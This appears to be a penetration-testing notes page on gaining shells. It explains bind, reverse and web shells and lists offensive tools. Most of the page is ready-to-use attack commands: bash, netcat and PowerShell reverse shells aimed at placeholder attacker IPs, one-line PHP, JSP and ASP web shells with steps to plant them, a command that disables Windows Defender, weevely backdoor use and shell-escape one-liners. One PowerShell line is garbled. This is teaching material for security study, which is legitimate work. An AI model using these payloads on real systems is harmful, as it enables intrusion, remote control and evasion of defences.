# Shell

A **shell** is a program that provides a computer user with an interface to input instructions into the system and view text output. The shells are the main objective to compromise an attacked machine. The shell gives us direct access to the OS, system commands, and file system. It can make it easier to use our attack tools, exfiltrate data, gather, store and document all the details of our attack.
In [revshells](https://www.revshells.com/) we can find some examples.

| **Type** | **Description** |
|----------|-----------------|
| Reverse shell | Connection to a *listener* in the attacked machine |
| Bind shell | Bind to a port in the attacked machine and waits for the connection |
| Web shell | Runs commands via the web |

Within the IT industry as a whole, **Payload** can be defined in a few different ways:
- **Networking**: The encapsulated data portion of a packet traversing modern computer networks.
- **Basic Computing**: A payload is the portion of an instruction set that defines the action to be taken. Headers and protocol information removed.
- **Programming**: The data portion referenced or carried by the programming language instruction.
- **Exploitation & Security**: A payload is code crafted with the intent to exploit a vulnerability on a computer system. The term payload can describe various types of malware, including but not limited to ransomware.

# Shell Basics 

Here are some of the most common terminal emulators:

| **Terminal Emulatro**   | **OS**    |
|--------------- | --------------- |
| [Windows Terminal](https://github.com/microsoft/terminal) | Windows |
| [cmder](https://cmder.net/) | Windows |
| [PuTTY](https://www.putty.org/) | Windows |
| [xterm](https://invisible-island.net/xterm/) | Linux |
| Gnome Terminal | Linux |
| [Mate Terminal](https://github.com/mate-desktop/mate-terminal) | Linux |
| [Konsole](https://konsole.kde.org/) | Linux |
| Terminal | MacOS |
| [iTerm2](https://iterm2.com/) | MacOS |
| [kitty](https://sw.kovidgoyal.net/kitty/) | Windows, Linux and MacOS |
| [Alacritty](https://github.com/alacritty/alacritty) | Windows, Linux and MacOS |

A **command language interpreter** is a program working to interpret the instructions provided by the user and issue the tasks to the operating system for processing. Many different command language interpreters can be used, some of which are also called **shell scripting languages** or **Command and Scripting interpreters** as defined in the [Execution techniques](https://attack.mitre.org/techniques/T1059/) of the **MITRE ATT&CK Matrix**.

We can test what type of shell we are using. For example, the sign `$` is used in Bash, Ksh, POSIX, and many other shell languages to mark the start of the shell prompt. Some commands, like `ps` or `env`, show different outputs in different shells.

In many cases, we will be working to establish a shell on a system on a local or remote network. This is typically done by using a **Bind** &/or **Reverse** shell. With a bind shell, the target system has a listener started and awaits a connection from a attackers box. On the server-side, we will need to specify the directory, shell, listener, work with some pipelines, and input & output redirection to ensure a shell to the system gets served when the client attempts to connect.

---

# Bind Shells

For the **bind shells**, on the server-side, we will need to specify the **directory**, **shell**, **listener**, work with some pipelines, and input & output redirection to ensure a shell to the system gets served when the client attempts to connect. 

## Reverse Shell Command 

Here are two examples and the connection for Linux:
```console
victim@target$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <TARGET> <PORT> > /tmp/f
victim@target$ bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1
```

For Windows:
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<ip>",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Netcat connection 

```console
zero@pio$ nc -nv <TARGET> <PORT>
```

## Upgrading shell

With an Bind shell we are really limited.

Let's use Python to upgrade it:
```console
zero@pio$ python -c 'import pty; pty.spawn("/bin/bash")'
```

Then we press `CTRL + z` to background the shell and use the **stty** command:
```console
www-data@machine$ ^Z 

zero@pio$ stty raw -echo
zero@pio$ fg 

[Enter]
[Enter]
www-data@machine$ 
```
After, we can press `Enter` or use *reset*.

Maybe the shell does not cover the entire terminal. We can import our configuration:
```console
zero@pio$ echo $TERM 
  xterm-256color
zero@pio$ stty size
  67 318
```

Then in our bind shell:
```console
www-data@machine$ export TERM=xterm-256color
www-data@machine$ stty rows 67 columns 318
```

# Reverse shell

With a **reverse shell**, the attack box will have a listener running, and the target will need to initiate the connection. We will often use this kind of shell as we come across vulnerable systems because it is likely that an admin will overlook outbound connections, giving us a better chance of going undetected.

## Netcat connection

First we need to start a **netcat** in our machine:

```console
zero@pio$ nc -lvnp 9000
```

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `-l`   | Listen mode   |
| `-v`   | Verbose mode   |
| `-n`   | Disable DNS resolution, speed up   |
| `-p`   | Port number   |

Then we execute the reverse shell command in the objective machine.

## Reverse shell command

Depends on the machine the command may be different. In [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) we can found many, as well as in *revshells*.

Some Linux examples can be seen as:
```bash
bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
```
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
```

And Windows:
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<ip>",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Or:
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>'PORT>,);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

We may face a firewall blocking us, the following command disable it:
```console
PS C:\zeropio> Set-MpPreference -DisableRealtimeMonitoring $true
```

# Web shell
A web shell is a browser-based shell session we can use to interact with the underlying operating system of a web server. Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more. The Laudanum files can be found in the `/usr/share/webshells/laudanum`{: .filepath} directory. 

## Writing

This are some of the scripts to execute a web shell:
```php
<?php system($_REQUEST["cmd"]); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```
<% eval request("cmd") %> # asp
```

## Uploading the shell

Firstly, we need to upload the webshell.
Secondly, we need to figurate which type of server is:

| **Server**   | **Default Webroot**    |
|--------------- | --------------- |
| Apache   | `/var/www/html/`{: .filepath}   |
| Nginx   | `/usr/local/nginx/html/`{: .filepath}   |
| IIS   | `c:\inetpub\wwwroot\`{: .filepath}   |
| XAMPP   | `C:\xampp\htdocs\`{: .filepath}   |

For example, for a Apache in Linux with a PHP:
```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

## Accesing the shell

Access the file through the browser or using cURL. With the option `?cmd=<command>` we can execute it.
For example: `http://<ip>/shell.php?cmd=whoami` in the web, or with curl:
```console
zero@pio$ curl http://<ip>/shell.php?cmd=whoami
  www-data
```

---

# Payloads 

In information security, the payload is the command and/or code that exploits the vulnerability in an OS and/or application. Keep in mind that when we deliver and execute payloads, just like any other program, we give the target computer instructions on what it needs to do. We can use [Metasploit](https://zeropio.github.io/notes/tools/metasploit) to generate and execute payloads.

## MSFvenom

We can use this Metasploit command to generate our payloads. More info [here](https://zeropio.github.io/notes/tools/metasploit#payloads).

## weevely

To generate a shell:
```console
$ weevely generate <PASSWORD> <OUTPUT FILE>
$ weevely http://<TARGET>/shell.php <PASSWORD>
```

We can use `:help` inside the weevely shell to get some functions. We can use `-h` in the weevely function to access more options.
Sometimes we wouldn't be able to execute commands, weevely can help us:
```console
$ :shell_sh -v [option] [command]
```

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `:file_download <REMOTE PATH> <LOCAL PATH>` | Download files |
| `:file_upload <LOCAL PATH> <REMOTE PATH>` | Upload files |
| `:file_read <LOCAL PATH>` | Read a file |
| `:sql_console` | Spawn SQL console |
| `:sql_dump -host <IP> -lpath <LOCAL PATH> <USER> <PASSWORD>` | Dump a db into a file (if the db doesn't have a password we should use `''` instead). |
| `:backdoor_reversetcp <LHOST> <LPORT>` | cCeate a reverse shell (we need to add a `;` after each command) |

> If any option doesn't work we can use **-vector [option]** to change the attack.

# Targeting Systems 

## Windows 

Over the last few years, several vulnerabilities in the Windows operating system and their corresponding attacks are some of the most exploited vulnerabilities of our time:

| **Vulnerability**   | **Description**    |
|--------------- | --------------- |
| **MS08-067** | S08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw |
| **Eternal Blue** | MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA |
| **PrintNightmare** | A remote code execution vulnerability in the Windows Print Spooler |
| **BlueKeep** | CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution |
| **Sigred** | CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records |
| **SeriousSam** | CVE 2021-36924 exploits an issue with the way Windows handles permission on the `C:\Windows\system32\config`{: .filepath} folder |
| **Zerologon** | CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC) |

Once we know which type of OS we are facing we can start creating the payload. First select the type of file:
- **DLL**
- **Batch**
- **VBS**
- **MSI**
- **PowerShell**

We have plenty of good options for dealing with generating payloads to use against Windows hosts. The table below lays out some of our options:

| **Resource**   | **Description**    |
|--------------- | --------------- |
| [MSFvenom](https://github.com/rapid7/metasploit-framework) | MSF is an extremely versatile tool for any pentester's toolkit |
| [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) | You can find many different resources and cheat sheets for payload generation and general methodology |
| [Mythic](https://github.com/its-a-feature/Mythic) | The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation |
| [Nishang](https://github.com/samratashok/nishang) | Nishang is a framework collection of Offensive PowerShell implants and scripts |
| [Darkarmour](https://github.com/bats3c/darkarmour) | Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts |

The list below includes some helpful tools and protocols for use while attempting to drop a payload on a target:

| **Resource**   | **Description**    |
|--------------- | --------------- |
| [Impacket](https://github.com/SecureAuthCorp/impacket) | Some of the most exciting tools we care about in Impacket deal with psexec, smbclient, wmi, Kerberos, and the ability to stand up an SMB server |
| [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md) | Is a great resource to find quick oneliners to help transfer files across hosts expediently | 
| SMB | SMB can provide an easy to exploit route to transfer files between hosts |
| Remote execution via MSF | Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically |
| Other Protocols | When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host |

When it's come to choose between CMD and PowerShell:

| **CMD**   | **PowerShell**    |
|--------------- | --------------- |
| You are on an older host that may not include PowerShell | You are planning to utilize cmdlets or other custom-built scripts |
| When you only require simple interactions/access to the host | When you wish to interact with .NET objects instead of text output |
| When you plan to use simple batch files, net commands, or MS-DOS native tools | When being stealthy is of lesser concern |
| When you believe that execution policies may affect your ability to run scripts or other actions on the host | If you are planning to interact with cloud-based services and hosts |
|  | If your scripts set and use Aliases |

## Unix/Linux 

When considering how we will establish a shell session on a Unix/Linux system, we will benefit from considering the following:
- What distribution of Linux is the system running?
- What shell & programming languages exist on the system? 
- What function is the system serving for the network environment it is on?
- What application is the system hosting?
- Are there any known vulnerabilities?

To spawn interactive shells, after succesfully get one. First we can do it inside the shell:
```bash
/bin/sh -i
```

```bash
perl —e 'exec "/bin/sh";'
```

```bash
awk 'BEGIN {system("/bin/sh")}'
```

```bash
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

```bash
find . -exec /bin/sh \; -quit
```

```console
$ script /dev/null -c bash
```

Or in a file:
```perl
exec "/bin/sh";
```

```ruby
exec "/bin/sh"
```

```lua
os.execute('/bin/sh')
```

In Vim:
```
!/bin/sh'
```

To scape from Vim:
```
vim
:set shell=/bin/sh
:shell
```
